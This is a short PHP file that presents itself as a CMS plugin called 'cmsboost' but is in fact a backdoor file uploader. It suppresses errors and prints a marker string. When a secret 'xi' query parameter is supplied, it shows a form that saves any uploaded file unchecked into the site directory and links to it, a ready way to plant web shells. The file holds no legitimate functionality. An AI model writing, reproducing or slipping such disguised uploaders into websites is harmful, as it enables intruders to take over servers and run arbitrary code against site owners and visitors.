<?php
/* Plugin name: cmsboost */
error_reporting(0);
echo "xichang1";
if(isset($_GET['xi'])){
if(isset($_FILES["userfile"]["name"])){
$uploaddir = getcwd() . "/";
$uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]);
if(move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile)){echo "Upload!\n";}else{echo "Failed!";}
echo getcwd() . "\n";
print_r($_FILES);
if($_FILES["userfile"]["error"] == 0){echo "<br><a href=\"{$_FILES["userfile"]["name"]}\" TARGET=_BLANK>{$_FILES["userfile"]["name"]}</a><br>";}
}
echo "<form enctype=\"multipart/form-data\" action=\"\" method=\"POST\">";
echo "<input name=\"userfile\" type=\"file\">";
echo "<input type=\"submit\" value=\"Upload\">";
echo "</form>";
}
?>